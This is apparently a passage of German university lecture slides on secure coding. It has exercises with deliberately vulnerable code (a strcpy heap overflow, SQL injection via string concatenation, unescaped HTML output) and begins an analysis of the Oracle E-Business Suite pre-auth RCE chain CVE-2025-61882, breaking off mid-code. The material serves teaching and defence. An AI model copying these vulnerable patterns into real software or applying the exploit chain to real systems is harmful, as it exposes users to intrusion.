<h2>CWE-306: Missing Authentication for Critical Function</h2>
<ld-deck>
<ld-card>
<dl class="field-list simple">
<dt>Beschreibung<span class="colon">:</span></dt>
<dd><p>Eine Anwendung führt eine kritische Funktion aus, ohne die Identität des Nutzers zu überprüfen. Kritische Funktionen sind solche, die entweder signifikante Ressourcen verbrauchen oder nur von privilegierten Nutzern ausgeführt werden sollten.</p>
</dd>
<dt>Sprachen<span class="colon">:</span></dt>
<dd><p>&quot;alle&quot;</p>
</dd>
</dl>
</ld-card><ld-card class="incremental">
<p class="rubric">Abhilfemaßnahmen und Erkennung</p>
<ul class="incremental-list simple">
<li><p>manuelle Code Reviews</p></li>
<li><p>statische Analyse (Binärcode und/oder Quellcode)</p></li>
</ul>
</ld-card></ld-deck></ld-topic>
<ld-topic class="new-section transition-scale" id="anmerkungen-dies-und-das">
<h2>Anmerkungen/Dies und Das</h2>
</ld-topic>
<ld-topic class="s-vertical-title" id="dump-c-c">
<h2>Dump C /  C++</h2>
<img alt="Dump C / C++" class="screenshot align-center" src="screenshots/dump_c_c++_2024_02_27.webp" />
</ld-topic>
<ld-topic class="s-vertical-title" id="c-is-missjudged-by-the-white-house">
<h2>C++ is missjudged by the White House</h2>
<img alt="C++ is missjudged" class="align-center" src="screenshots/c++_creator_rebuts_white_house_warning-infoworld_2024_03_26.webp" />
</ld-topic>
<ld-topic class="new-section transition-fade" id="open-worldwide-application-security-project-owasp">
<h2>Open Worldwide Application Security Project (OWASP)</h2>
</ld-topic>
<ld-topic id="owasp">
<h2>OWASP</h2>
<ul class="incremental-list simple">
<li><p>gemeinnützige Stiftung, die sich für die Verbesserung der Sicherheit von Software einsetzt</p></li>
<li><p>2001 gegründet</p></li>
<li><p>weltweit tätig</p></li>
<li><p>Stellt insbesondere Foren, Dokumente und Werkzeuge bereit</p></li>
<li><p>Dokumente, die bei der Entwicklung sicherer Anwendungen unterstützen:</p>
<ul>
<li><p><a class="reference external" href="https://owasp.org/www-project-web-security-testing-guide/">OWASP Web Security Testing Guide</a></p></li>
<li><p><a class="reference external" href="https://owasp.org/www-project-code-review-guide/">OWASP Code Review Guide</a></p></li>
</ul>
</li>
<li><p>Ausgewählte Projekte:</p>
<ul class="incremental-list">
<li><p><a class="reference external" href="https://owasp.org/www-project-top-ten/">OWASP Top 10 (die relevantesten Sicherheitsprobleme bei Webanwendungen)</a></p></li>
<li><p><a class="reference external" href="https://owasp.org/www-project-cheat-sheets/">Cheat Sheets</a></p></li>
<li><p><a class="reference external" href="https://owasp.org/www-project-dependency-track/">OWASP Dependency-Track</a></p></li>
<li><p><a class="reference external" href="https://owasp.org/www-project-web-security-testing-guide/">OWASP Web Security Testing Guide</a></p></li>
</ul>
</li>
</ul>
</ld-topic>
<ld-topic class="exercises" id="ubung-schwachstelle-n">
<h2>Übung: Schwachstelle(n)</h2>
<ld-scrollable>
<div class="ld-exercise" data-exercise-id="23" data-exercise-title="23 - malloc verstehen" id="ld-exercise-23">
<p class="ld-exercise-title rubric"><code class="c"><span class="name">malloc</span></code> verstehen</p>
<ol class="arabic simple">
<li><p>Benenne die Schwachstelle(n) entsprechend der CWEs (ohne ID).</p></li>
<li><p>Identifiziere die für die Schwachstelle(n) relevanten Zeilen im Code.</p></li>
<li><p>Gebe - falls möglich - einen Angriffsvektor an.</p></li>
<li><p>Skizziere mögliche Auswirkung der Schwachstelle(n) (z. B. Verlust der Vertraulichkeit, Integrität oder Verfügbarkeit; Umgehung der Zugriffskontrolle; beliebige Codeausführung, ...)</p></li>
</ol>
<pre class="code C literal-block"><small class="ln"> 1 </small><code data-lineno=" 1 "><span class="comment preproc">#include</span><span class="whitespace"> </span><span class="comment preprocfile">&lt;stdio.h&gt;</span><span class="comment preproc">
</span></code><small class="ln"> 2 </small><code data-lineno=" 2 "><span class="comment preproc">#include</span><span class="whitespace"> </span><span class="comment preprocfile">&lt;string.h&gt;</span><span class="comment preproc">
</span></code><small class="ln"> 3 </small><code data-lineno=" 3 "><span class="comment preproc"></span><span class="keyword type">void</span><span class="whitespace"> </span><span class="name function">process</span><span class="punctuation">(</span><span class="keyword type">char</span><span class="whitespace"> </span><span class="operator">*</span><span class="name">str</span><span class="punctuation">)</span><span class="whitespace"> </span><span class="punctuation">{</span><span class="whitespace">
</span></code><small class="ln"> 4 </small><code data-lineno=" 4 "><span class="whitespace">    </span><span class="keyword type">char</span><span class="whitespace"> </span><span class="operator">*</span><span class="name">buffer</span><span class="whitespace"> </span><span class="operator">=</span><span class="whitespace"> </span><span class="name">malloc</span><span class="punctuation">(</span><span class="literal number integer">16</span><span class="punctuation">);</span><span class="whitespace">
</span></code><small class="ln"> 5 </small><code data-lineno=" 5 "><span class="whitespace">    </span><span class="name">strcpy</span><span class="punctuation">(</span><span class="name">buffer</span><span class="punctuation">,</span><span class="whitespace"> </span><span class="name">str</span><span class="punctuation">);</span><span class="whitespace">
</span></code><small class="ln"> 6 </small><code data-lineno=" 6 "><span class="whitespace">    </span><span class="punctuation">...</span><span class="whitespace">
</span></code><small class="ln"> 7 </small><code data-lineno=" 7 "><span class="whitespace">    </span><span class="comment single">// ... definitively executed in the future: free(buffer);
</span></code><small class="ln"> 8 </small><code data-lineno=" 8 "><span class="comment single"></span><span class="punctuation">}</span><span class="whitespace">
</span></code><small class="ln"> 9 </small><code data-lineno=" 9 "><span class="whitespace"></span><span class="keyword type">int</span><span class="whitespace"> </span><span class="name function">main</span><span class="punctuation">(</span><span class="keyword type">int</span><span class="whitespace"> </span><span class="name">argc</span><span class="punctuation">,</span><span class="whitespace"> </span><span class="keyword type">char</span><span class="whitespace"> </span><span class="operator">*</span><span class="name">argv</span><span class="punctuation">[])</span><span class="whitespace"> </span><span class="punctuation">{</span><span class="whitespace">
</span></code><small class="ln">10 </small><code data-lineno="10 "><span class="whitespace">    </span><span class="keyword">if</span><span class="whitespace"> </span><span class="punctuation">(</span><span class="name">argc</span><span class="whitespace"> </span><span class="operator">&lt;</span><span class="whitespace"> </span><span class="literal number integer">2</span><span class="punctuation">)</span><span class="whitespace"> </span><span class="punctuation">{</span><span class="whitespace"> </span><span class="name">printf</span><span class="punctuation">(</span><span class="literal string">&quot;Usage: %s &lt;string&gt;</span><span class="literal string escape">\n</span><span class="literal string">&quot;</span><span class="punctuation">,</span><span class="whitespace"> </span><span class="name">argv</span><span class="punctuation">[</span><span class="literal number integer">0</span><span class="punctuation">]);</span><span class="whitespace"> </span><span class="keyword">return</span><span class="whitespace"> </span><span class="literal number integer">1</span><span class="punctuation">;</span><span class="whitespace"> </span><span class="punctuation">}</span><span class="whitespace">
</span></code><small class="ln">11 </small><code data-lineno="11 "><span class="whitespace">    </span><span class="name">process</span><span class="punctuation">(</span><span class="name">argv</span><span class="punctuation">[</span><span class="literal number integer">1</span><span class="punctuation">]);</span><span class="whitespace">
</span></code><small class="ln">12 </small><code data-lineno="12 "><span class="whitespace">    </span><span class="keyword">return</span><span class="whitespace"> </span><span class="literal number integer">0</span><span class="punctuation">;</span><span class="whitespace">
</span></code><small class="ln">13 </small><code data-lineno="13 "><span class="whitespace"></span><span class="punctuation">}</span></code></pre>
<div class="ld-exercise-solution" data-encrypted="true">
MTAwMDAw:6RinVf6o/zwVC/wvT+jGpc32U9UFylI1nWCwjOTb7l0=:u7OrKCnQQczBWwe3:PLPY+eFnNgPbOioAlzvOZPA4Pcz7vvfWgzJgxHCZpKQB33Nr/zjRcqUEamyMGOVxp4a6CFYzXSfi0N/VlirIDtOuMiaVyZJI/JHbbwcwI8vcSclPmUNZOcUUgsu8x+Q8Hry7jugIxfIwdL4Hq90iWvU1CrsfYjRcC7zpx8eQAX9ncJticqGPtWoIxH4NURd5NoEN3feEkmCjd6NeNC111Inw2dfRhjMsTRw+14KxXGMLIqiq8CznGQFKMbvt6unSyx0340aDsGe6ptswE7YP7KCNCezrA93Ye5LdRvtHiP+prD9W/F67LPHYJhyXU84uFGPXUmilJlwnFN4z1jZMFRBTpF7TdEsfRu0By3pAZmP45vUvc3sD8K4dX/ID+/mDpbNy/VauUxi/nh9j1MVVmJ2GKOL2l3MDcjKvCgHWCjRO8DYQCXhC+K2J7EC+dedhfsZkbtuGMYdF/5p1QUBKErly6M7L9szywUCfRVzCSjpnS7z7smgui8Rn9zK8ICZaNYE3m+0go27nGFTNSq8nIwuSSrgxwR60O3/lz3wAFwfAUYTdE6wb3yybmVtV4DK43G7wF4hyxhJWxhcEoF/Q</div>
</div>
</ld-scrollable></ld-topic>
<ld-topic class="exercises" id="ubung-schwachstelle-n-1">
<h2>Übung: Schwachstelle(n)</h2>
<div class="ld-exercise" data-exercise-id="24" data-exercise-title="24 - REST API" id="ld-exercise-24">
<p class="ld-exercise-title rubric">REST API</p>
<p>Eine REST API verhält sich wie folgt, wenn man einem Blog einen Kommentar hinzufügt:</p>
<pre class="code HTTP literal-block"><small class="ln">1 </small><code data-lineno="1 "><span class="name function">POST</span> <span class="name namespace">/post/comment</span> <span class="keyword reserved">HTTP</span><span class="operator">/</span><span class="literal number">1.1</span>
</code><small class="ln">2 </small><code data-lineno="2 "><span class="name attribute">Host</span><span class="operator">:</span> <span class="literal">important-website.com</span>
</code><small class="ln">3 </small><code data-lineno="3 "><span class="name attribute">Content-Length</span><span class="operator">:</span> <span class="literal">100</span>
</code><small class="ln">4 </small><code data-lineno="4 ">
</code><small class="ln">5 </small><code data-lineno="5 ">postId=3&amp;comment=This+&lt;post&gt;+was+helpful.&amp;name=Karl+Gustav</code></pre>
<p>Fragt man danach den Webservice nach dem Kommentar, dann erhält man folgendes zurück:</p>
<pre class="code HTML literal-block"><small class="ln">1 </small><code data-lineno="1 "><span class="punctuation">&lt;</span><span class="name tag">div</span> <span class="name attribute">class</span><span class="operator">=</span><span class="literal string">&quot;comment&quot;</span><span class="punctuation">&gt;</span>
</code><small class="ln">2 </small><code data-lineno="2 ">    <span class="punctuation">&lt;</span><span class="name tag">div</span> <span class="name attribute">class</span><span class="operator">=</span><span class="literal string">&quot;name&quot;</span><span class="punctuation">&gt;</span>Karl Gustav<span class="punctuation">&lt;/</span><span class="name tag">div</span><span class="punctuation">&gt;</span>
</code><small class="ln">3 </small><code data-lineno="3 ">    <span class="punctuation">&lt;</span><span class="name tag">div</span> <span class="name attribute">class</span><span class="operator">=</span><span class="literal string">&quot;comment&quot;</span><span class="punctuation">&gt;</span>This <span class="punctuation">&lt;</span><span class="name tag">post</span><span class="punctuation">&gt;</span> was helpful.<span class="punctuation">&lt;/</span><span class="name tag">div</span><span class="punctuation">&gt;&lt;/</span><span class="name tag">div</span><span class="punctuation">&gt;</span></code></pre>
<p>Bewerten Sie die Schwachstelle: CWE Name, problematische Codestelle(n), möglicher Angriffsvektor und mögliche Auswirkung.</p>
<div class="ld-exercise-solution" data-encrypted="true">
MTAwMDAw:fVIU4kU3SwKGZwESfO1OC7zPCw2AWas9amNXJEdYt48=:iZsRG0nSXCVHlTx0:mNd6VElX/Z3iC066HB4YgDqw5Ia+BlJw9CZpf2R0YWphqxCJ9KPmwPeYXefkhWA+rE0JkhlnKmkuAYDEP1AfnA5hNDvpnCX0RGrEsvPF1Ars3pLGLcXzTaHM6lMqSHDb87TdGyCyIV4wkj/ATxSQD2ti2HmPyGpdrW5nxgiQg/AzUhLPiXiDbCoawggPidTpWIiM3AI4+llQWeKoxqXhrUlNialp9KbD8jn1ptFVs4gfDMQRIgnE5Pb2yF2dbKReR0kuX6F4IffhEG3GLMbsocbCd1Z27omBfncimKLS1Pb5ipeaTQ2yyNONK2bW7wHXRySmOCGDDvS6YizhEUYwe94irryuQknPiAmZGDJdqDwSsjHs84Q9dwglqRBqf8n+iEcI7bWpYto8ILq9Jndkbzx3dzK4bW1Q79rVUzC07r5+4cwFXm2OYP9Q6xkMDFcjRFY6VqhTXFKhP2xiOvLm1qgf0OFAIti4Hv5ZeeiREbZT48FydKYd5iSZxgheGruvhgq9eiEf+CAzpIWwqJr880aKXluJfTXnkbOW4wAHkQIGaogUScgmSTE90p3JgtZOAXRKdHtOrMwIXP2t3YNuZPXPBffHyGizjyAa3w1kbEAqlpjvN0u4XbryOLokD1oJnXWkEjQcEBE8yUJdBA8KJOEv2T/+RhKAxDtVS4mjaMWuhC1AA10nCsWhXWi7EwkPYL8H9KpDFMQkn66rs2DadJNBZpuDu5jYNtWeBtE=</div>
</div>
</ld-topic>
<ld-topic class="exercises" id="ubung-schwachstelle-n-2">
<h2>Übung: Schwachstelle(n)</h2>
<div class="ld-exercise" data-exercise-id="25" data-exercise-title="25 - SQL Abfrage mit Java" id="ld-exercise-25">
<p class="ld-exercise-title rubric">SQL Abfrage mit Java</p>
<pre class="code java literal-block"><small class="ln">1 </small><code data-lineno="1 "><span class="name">String</span><span class="whitespace"> </span><span class="name">query</span><span class="whitespace"> </span><span class="operator">=</span><span class="whitespace">
</span></code><small class="ln">2 </small><code data-lineno="2 "><span class="whitespace">    </span><span class="literal string">&quot;SELECT account_balance FROM user_data WHERE user_name = &quot;</span><span class="whitespace">
</span></code><small class="ln">3 </small><code data-lineno="3 "><span class="whitespace">        </span><span class="operator">+</span><span class="whitespace"> </span><span class="name">request</span><span class="punctuation">.</span><span class="name attribute">getParameter</span><span class="punctuation">(</span><span class="literal string">&quot;customerName&quot;</span><span class="punctuation">);</span><span class="whitespace">
</span></code><small class="ln">4 </small><code data-lineno="4 "><span class="whitespace"></span><span class="keyword">try</span><span class="whitespace"> </span><span class="punctuation">{</span><span class="whitespace">
</span></code><small class="ln">5 </small><code data-lineno="5 "><span class="whitespace">    </span><span class="name">Statement</span><span class="whitespace"> </span><span class="name">statement</span><span class="whitespace"> </span><span class="operator">=</span><span class="whitespace"> </span><span class="name">connection</span><span class="punctuation">.</span><span class="name attribute">createStatement</span><span class="punctuation">(</span><span class="whitespace"> </span><span class="punctuation">...</span><span class="whitespace"> </span><span class="punctuation">);</span><span class="whitespace">
</span></code><small class="ln">6 </small><code data-lineno="6 "><span class="whitespace">    </span><span class="name">ResultSet</span><span class="whitespace"> </span><span class="name">results</span><span class="whitespace"> </span><span class="operator">=</span><span class="whitespace"> </span><span class="name">statement</span><span class="punctuation">.</span><span class="name attribute">executeQuery</span><span class="punctuation">(</span><span class="whitespace"> </span><span class="name">query</span><span class="whitespace"> </span><span class="punctuation">);</span><span class="whitespace">
</span></code><small class="ln">7 </small><code data-lineno="7 "><span class="whitespace"></span><span class="punctuation">}</span></code></pre>
<p>Bewerten Sie die Schwachstelle: CWE Name, problematische Codestelle(n), möglicher Angriffsvektor und mögliche Auswirkung.</p>
</div>
</ld-topic>
<ld-topic class="exercises" id="ubung-schwachstelle-n-3">
<h2>Übung: Schwachstelle(n)</h2>
<aside class="admonition dd-margin-left-3em note">
<p class="admonition-title">Bemerkung</p>
<p><strong>URL Encoding</strong></p>
<dl class="field-list simple">
<dt>%20<span class="colon">:</span></dt>
<dd><p>Leerzeichen</p>
</dd>
<dt>%22<span class="colon">:</span></dt>
<dd><p>&quot;</p>
</dd>
<dt>%3C<span class="colon">:</span></dt>
<dd><p>&lt;</p>
</dd>
<dt>%3E<span class="colon">:</span></dt>
<dd><p>&gt;</p>
</dd>
<dt>%2F<span class="colon">:</span></dt>
<dd><p>/</p>
</dd>
</dl>
</aside>
<div class="ld-exercise" data-exercise-id="26" data-exercise-title="26 - Verwendung von HTTP Query Parametern" id="ld-exercise-26">
<p class="ld-exercise-title rubric">Verwendung von HTTP Query Parametern</p>
<p>Sie beobachten folgendes Verhalten einer Webseite:</p>
<p><strong>Anfrage</strong></p>
<pre class="code http literal-block"><small class="ln">1 </small><code data-lineno="1 "><span class="error">https://my-website.com/search?</span><span class="whitespace">
</span></code><small class="ln">2 </small><code data-lineno="2 "><span class="whitespace"></span><span class="error">      term=This%20is%20a%20%3C%22%3Egift%3C%2F%22%3E</span></code></pre>
<p><strong>Antwort</strong></p>
<pre class="code HTML literal-block"><small class="ln">1 </small><code data-lineno="1 "><span class="punctuation">&lt;</span><span class="name tag">div</span> <span class="name attribute">class</span><span class="operator">=</span><span class="literal string">&quot;search-result&quot;</span><span class="punctuation">&gt;</span>
</code><small class="ln">2 </small><code data-lineno="2 ">    <span class="punctuation">&lt;</span><span class="name tag">div</span> <span class="name attribute">class</span><span class="operator">=</span><span class="literal string">&quot;title&quot;</span><span class="punctuation">&gt;</span>This is a <span class="error">&lt;</span>&quot;&gt;gift<span class="error">&lt;</span>/&quot;&gt;<span class="punctuation">&lt;/</span><span class="name tag">div</span><span class="punctuation">&gt;</span>
</code><small class="ln">3 </small><code data-lineno="3 "><span class="punctuation">&lt;/</span><span class="name tag">div</span><span class="punctuation">&gt;</span></code></pre>
<p>Bewerten Sie die Schwachstelle: CWE Name, problematische Codestelle(n), möglicher Angriffsvektor und mögliche Auswirkung.</p>
<div class="ld-exercise-solution" data-encrypted="true">
MTAwMDAw:ftNcLIdvboBzJYicOp9DJ7qn9Rpt7vtEptygS+QnJOs=:XSGslkeObFoUmefA:zVn81Us+UzU0mzEMyML3ymVbD+WLU5pS659eKktor2IOXV2dRbWOUJHrpR49y/jbXWgX+akOJLpyGpHYTHFKJhQdAe/usSypg0dCccxwZ67AVH2O99B07ULErd9Tsu4UEqhUy4nD0nsFu3v9Uq4dywGAFEQ9SASULhTTfQ4ES/Qpnc7UkMu+T4DYf54+yGfeSOj/oFu4WHHJFU5tKMfLmuT4TG9oFHqgkua0KPJ5VfPKQjfv+NgiZi+ojvdrCEhn0OZaNjwVOrDrlpNLcYVlzeLdQWJufe7fzMhTJowHZ2Pk/k2UC5CyLxAdn7KfV3l6VZm6mqJEi3CrpLbwe52zaBv44ETnWSDtv1haQXdIaMe/IdQYvWyAmpuOGdCQ3InjyxBUft6kTmSz9Aw63OtyKZwRbTzY3GNZNmQcExa4ykrZUyrgReroth0sdeQ1LiSbO0ar7pkM2Jwqj4EN7Esxc/YHKHJUgJaxs9DSwy6t4/ji1YHV7WvlhBW9bHdX1YE8nqSOQZ2M+E0nqopeND+XgyAYMGBhemRKRzNxbyuwq13TEJrIYn+rhmMB5jyO193mcAypE9KT+jg5v6cYHigJ4AB4gVU3qf9wVWJnwkQvkbsCpilawwWjz/OGDA==</div>
</div>
</ld-topic>
<ld-topic class="new-section transition-flip" id="studium-eines-real-world-exploits">
<h2>Studium eines Real-World Exploits</h2>
<div class="section-subtitle docutils container">
<p>CVE-2025-61882</p>
</div>
</ld-topic>
<ld-topic id="oracle-e-business-suite-pre-auth-rce-chain-cve-2025-61882">
<h2><a class="reference external" href="https://www.oracle.com/security-alerts/alert-cve-2025-61882.html?ref=labs.watchtowr.com">Oracle E-Business Suite Pre-Auth RCE Chain - CVE-2025-61882</a></h2>
<ld-deck>
<ld-card>
<p class="rubric">Beschreibung</p>
<blockquote class="epigraph">
<p>This vulnerability is remotely exploitable without authentication<span class="incremental">, i.e., it may be exploited over a network without the need for a username and password.</span> <span class="incremental">If successfully exploited, this vulnerability may result in remote code execution.</span></p>
<p class="attribution">—<a class="reference external" href="https://labs.watchtowr.com/well-well-well-its-another-day-oracle-e-business-suite-pre-auth-rce-chain-cve-2025-61882well-well-well-its-another-day-oracle-e-business-suite-pre-auth-rce-chain-cve-2025-61882/">Zusammenfassung von WatchTowr</a></p>
</blockquote>
<aside class="admonition incremental">
<p class="admonition-title">Disclaimer</p>
<p>Im Folgenden sind die Codeausschnitte reformatiert und stark auf das Wesentliche gekürzt. Wer mehr Informationen braucht, findet auf <a class="reference external" href="https://labs.watchtowr.com/well-well-well-its-another-day-oracle-e-business-suite-pre-auth-rce-chain-cve-2025-61882well-well-well-its-another-day-oracle-e-business-suite-pre-auth-rce-chain-cve-2025-61882">WatchTowr</a> die Analyse.</p>
</aside>
</ld-card><ld-card class="incremental">
<ul class="incremental-list">
<li><p>ein echter Zero-Day (inkl. Ausnutzung) (Oktober 2025)</p></li>
<li><p>eine Kette von kleineren und mittleren Schwachstellen, die zu einer Schwachstelle mit einem Rating von 9.8 führen. (<span class="red">Nur ein CVE dazu zu vergeben ist nicht die Norm!</span>)</p>
<p class="rubric">CVSS Score Berechnung</p>
<table>
<thead>
<tr><th class="head"><p>Attack Vector</p></th>
<th class="head"><p>Attack C'plexity</p></th>
<th class="head"><p>Privs Req'd</p></th>
<th class="head"><p>User Interact</p></th>
<th class="head"><p>Scope</p></th>
<th class="head"><p>Confi.</p></th>
<th class="head"><p>Integrity</p></th>
<th class="head"><p>Avail.</p></th>
</tr>
</thead>
<tbody>
<tr><td><p>Network</p></td>
<td><p>Low</p></td>
<td><p>None</p></td>
<td><p>None</p></td>
<td><p>Unchanged</p></td>
<td><p>High</p></td>
<td><p>High</p></td>
<td><p>High</p></td>
</tr>
</tbody>
</table>
</li>
<li><p>der PoC ist frei verfügbar</p>
<div class="peripheral docutils container">
<p>(Von einem <em>Threat Actor</em> zur Verfügung gestellt als Racheaktion gegen einen Zweiten.)</p>
</div>
</li>
<li><p>Zeigt einen sehr hohen Grad  von Können</p></li>
</ul>
<div class="supplemental docutils container">
<p>Dadurch, dass nur ein CVE vergeben wurde, ist es zum Beispiel schwer nachzuvollziehen, ob ein Patch alle zu Grunde liegenden Schwachstellen behoben hat oder ob nur eine Schwachstelle behoben wurde und somit lediglich die Kette unterbrochen wurde.</p>
</div>
</ld-card><ld-card class="incremental">
<p class="rubric">1. Server-side Request Forgery</p>
<ld-deck>
<ld-card>
<p class="rubric">Initiale Schwachstelle</p>
<pre class="code java literal-block"><small class="ln">1 </small><code data-lineno="1 "><span class="punctuation">...</span><span class="whitespace"> </span><span class="keyword">else</span><span class="whitespace"> </span><span class="keyword">if</span><span class="whitespace"> </span><span class="punctuation">(</span><span class="name">paramHttpServletRequest</span><span class="punctuation">.</span><span class="name attribute">getParameter</span><span class="punctuation">(</span><span class="literal string">&quot;getUiType&quot;</span><span class="punctuation">)</span><span class="whitespace"> </span><span class="operator">!=</span><span class="whitespace"> </span><span class="keyword constant">null</span><span class="punctuation">)</span><span class="whitespace"> </span><span class="punctuation">{</span><span class="whitespace">
</span></code><small class="ln">2 </small><code data-lineno="2 "><span class="whitespace">  </span><span class="name">String</span><span class="whitespace"> </span><span class="name">str</span><span class="whitespace"> </span><span class="operator">=</span><span class="whitespace"> </span><span class="name">paramHttpServletRequest</span><span class="punctuation">.</span><span class="name attribute">getParameter</span><span class="punctuation">(</span><span class="literal string">&quot;redirectFromJsp&quot;</span><span class="punctuation">);</span><span class="comment single">// [1]</span><span class="whitespace">
</span></code><small class="ln">3 </small><code data-lineno="3 "><span class="whitespace">  </span><span class="name">XMLDocument</span><span class="whitespace"> </span><span class="name">xMLDocument</span><span class="whitespace"> </span><span class="operator">=</span><span class="whitespace"> </span><span class="name">XmlUtil</span><span class="punctuation">.</span><span class="whitespace">
</span></code><small class="ln">4 </small><code data-lineno="4 "><span class="whitespace">      </span><span class="name function">parseXmlString</span><span class="punctuation">(</span><span class="name">paramHttpServletRequest</span><span class="punctuation">.</span><span class="name attribute">getParameter</span><span class="punctuation">(</span><span class="literal string">&quot;getUiType&quot;</span><span class="punctuation">));</span><span class="comment single">// [0]</span><span class="whitespace">
</span></code><small class="ln">5 </small><code data-lineno="5 "><span class="whitespace">  </span><span class="keyword">if</span><span class="whitespace"> </span><span class="punctuation">(</span><span class="name">str</span><span class="whitespace"> </span><span class="operator">==</span><span class="whitespace"> </span><span class="keyword constant">null</span><span class="whitespace"> </span><span class="operator">||</span><span class="whitespace"> </span><span class="literal string">&quot;false&quot;</span><span class="punctuation">.</span><span class="name attribute">equalsIgnoreCase</span><span class="punctuation">(</span><span class="name">str</span><span class="punctuation">))</span><span class="whitespace"> </span><span class="punctuation">{</span><span class="whitespace"> </span><span class="punctuation">...</span><span class="whitespace"> </span><span class="keyword">return</span><span class="punctuation">;</span><span class="whitespace"> </span><span class="punctuation">}</span><span class="whitespace">
</span></code><small class="ln">6 </small><code data-lineno="6 "><span class="whitespace">  </span><span class="name">createNew</span><span class="punctuation">(</span><span class="whitespace">
</span></code><small class="ln">7 </small><code data-lineno="7 "><span class="whitespace">    </span><span class="name">xMLDocument</span><span class="punctuation">,</span><span class="whitespace">
</span></code><small class="ln">8 </small><code data-lineno="8 "><span class="whitespace">    </span><span class="name">httpSession</span><span class="punctuation">,</span><span class="whitespace"> </span><span class="name">paramHttpServletRequest</span><span class="punctuation">,</span><span class="whitespace"> </span><span class="name">paramHttpServletResponse</span><span class="punctuation">);</span><span class="whitespace"> </span><span class="punctuation">}</span><span class="whitespace"> </span><span class="comment single">// [2]</span></code></pre>
<div class="incremental docutils container">
<p><strong>Analyse</strong></p>
<p>Der Code akzeptiert ein XML Dokument über den <code class="java"><span class="literal string">&quot;getUIType&quot;</span></code> parameter[0], wenn <code class="java"><span class="literal string">&quot;redirectFromJsp&quot;</span></code> [1] gesetzt ist. Dann wird der Wert an die Funktion <code class="java"><span class="name">createNew</span><span class="punctuation">()</span></code> [2] weitergegeben.</p>
</div>
</ld-card><ld-card class="incremental">
<p class="rubric">Verarbeitung des XML Dokuments</p>
<pre class="code java literal-block"><small class="ln">1 </small><code data-lineno="1 "><span class="name">String</span><span class="whitespace"> </span><span class="name">str1</span><span class="whitespace"> </span><span class="operator">=</span><span class="whitespace"> </span><span class="name">CZUiUtilities</span><span class="punctuation">.</span><span class="name attribute">resubXMLAndURLChars</span><span class="punctuation">(</span><span class="whitespace">
</span></code><small class="ln">2 </small><code data-lineno="2 "><span class="whitespace">    </span><span class="name">XmlUtil</span><span class="punctuation">.</span><span class="name attribute">getReturnUrlParameter</span><span class="punctuation">(</span><span class="name">paramXMLDocument</span><span class="punctuation">));</span><span class="whitespace">
</span></code><small class="ln">3 </small><code data-lineno="3 "><span class="whitespace"></span><span class="name">clientAdapter</span><span class="punctuation">.</span><span class="name attribute">setReturnUrl</span><span class="punctuation">(</span><span class="name">str1</span><span class="punctuation">);</span></code></pre>
<div class="incremental docutils container">
<p><strong>Analyse</strong></p>
<p>Aus dem Dokument wird der <code class="java"><span class="literal string">&quot;returnUrl&quot;</span></code> Parameter ausgelesen und nach einigen Schritten an die folgende Methode weitergeleitet.</p>
</div>
</ld-card><ld-card class="incremental">
<p class="rubric">SSRF</p>
<pre class="code java literal-block"><small class="ln"> 1 </small><code data-lineno=" 1 "><span class="whitespace"> </span><span class="keyword declaration">protected</span><span class="whitespace"> </span><span class="keyword type">void</span><span class="whitespace"> </span><span class="name function">postXmlMessage</span><span class="punctuation">(</span><span class="name">String</span><span class="whitespace"> </span><span class="name">paramString1</span><span class="punctuation">,</span><span class="whitespace"> </span><span class="name">String</span><span class="whitespace"> </span><span class="name">paramString2</span><span class="punctuation">)</span><span class="whitespace"> </span><span class="punctuation">{</span><span class="whitespace">
</span></code><small class="ln"> 2 </small><code data-lineno=" 2 "><span class="whitespace">  </span><span class="keyword">try</span><span class="whitespace"> </span><span class="punctuation">{</span><span class="whitespace">
</span></code><small class="ln"> 3 </small><code data-lineno=" 3 "><span class="whitespace">    </span><span class="name">URL</span><span class="whitespace"> </span><span class="name">uRL</span><span class="whitespace"> </span><span class="operator">=</span><span class="whitespace"> </span><span class="name">getUrl</span><span class="punctuation">(</span><span class="name">paramString1</span><span class="punctuation">);</span><span class="whitespace">
</span></code><small class="ln"> 4 </small><code data-lineno=" 4 "><span class="whitespace">    </span><span class="keyword">if</span><span class="whitespace"> </span><span class="punctuation">(</span><span class="name">uRL</span><span class="whitespace"> </span><span class="operator">!=</span><span class="whitespace"> </span><span class="keyword constant">null</span><span class="punctuation">)</span><span class="whitespace"> </span><span class="name">paramString1</span><span class="whitespace"> </span><span class="operator">=</span><span class="whitespace"> </span><span class="name">uRL</span><span class="punctuation">.</span><span class="name attribute">toExternalForm</span><span class="punctuation">();</span><span class="whitespace">
</span></code><small class="ln"> 5 </small><code data-lineno=" 5 "><span class="whitespace">    </span><span class="name">CZURLConnection</span><span class="whitespace"> </span><span class="name">cZURLConnection</span><span class="whitespace"> </span><span class="operator">=</span><span class="whitespace"> </span><span class="keyword">new</span><span class="whitespace"> </span><span class="name">CZURLConnection</span><span class="punctuation">(</span><span class="name">paramString1</span><span class="punctuation">);</span><span class="whitespace">
</span></code><small class="ln"> 6 </small><code data-lineno=" 6 "><span class="whitespace">    </span><span class="name">String</span><span class="operator">[]</span><span class="whitespace"> </span><span class="name">arrayOfString1</span><span class="whitespace"> </span><span class="operator">=</span><span class="whitespace"> </span><span class="punctuation">{</span><span class="whitespace"> </span><span class="literal string">&quot;XMLmsg&quot;</span><span class="whitespace"> </span><span class="punctuation">};</span><span class="whitespace">
</span></code><small class="ln"> 7 </small><code data-lineno=" 7 "><span class="whitespace">    </span><span class="name">String</span><span class="operator">[]</span><span class="whitespace"> </span><span class="name">arrayOfString2</span><span class="whitespace"> </span><span class="operator">=</span><span class="whitespace"> </span><span class="punctuation">{</span><span class="whitespace"> </span><span class="name">paramString2</span><span class="whitespace"> </span><span class="punctuation">};</span><span class="whitespace">
</span></code><small class="ln"> 8 </small><code data-lineno=" 8 "><span class="whitespace">    </span><span class="name">cZURLConnection</span><span class="punctuation">.</span><span class="name attribute">connect</span><span class="punctuation">(</span><span class="literal number integer">1</span><span class="punctuation">,</span><span class="whitespace"> </span><span class="name">arrayOfString1</span><span class="punctuation">,</span><span class="whitespace"> </span><span class="name">arrayOfString2</span><span class="punctuation">);</span><span class="whitespace">
</span></code><small class="ln"> 9 </small><code data-lineno=" 9 "><span class="whitespace">    </span><span class="name">cZURLConnection</span><span class="punctuation">.</span><span class="name attribute">close</span><span class="punctuation">();</span><span class="whitespace">
